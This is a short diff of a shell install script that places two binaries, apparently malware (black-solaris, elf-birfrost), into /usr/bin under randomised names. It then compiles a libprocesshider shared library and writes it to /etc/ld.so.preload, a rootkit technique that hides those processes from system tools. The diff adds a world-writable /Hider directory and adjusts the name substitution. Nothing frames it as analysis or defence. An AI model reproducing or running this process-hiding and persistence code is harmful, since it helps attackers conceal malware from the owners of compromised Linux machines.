@@ -15,8 +15,9 @@ mv black-solaris /usr/bin/"$blacksolaris" && chmod +x /usr/bin/"$blacksolaris"
 mv elf-birfrost /usr/bin/"$birfrost" && chmod +x /usr/bin/"$birfrost"
 
 #开始制作Hider
+mkdir /Hider && chmod 0777 -R /Hider
 unzip hide.zip
-sed -i "s/mjolnir/$blacksolaris/g" `grep "mjolnir" -rl "processhider.c"` && make
+sed -i "s/black-solaris/$blacksolaris/g" `grep "black-solaris" -rl "processhider.c"` && make
 mv libprocesshider.so /Hider/"$blacksolaris"'.so'
 echo /Hider/"$blacksolaris"'.so' >> /etc/ld.so.preload
 
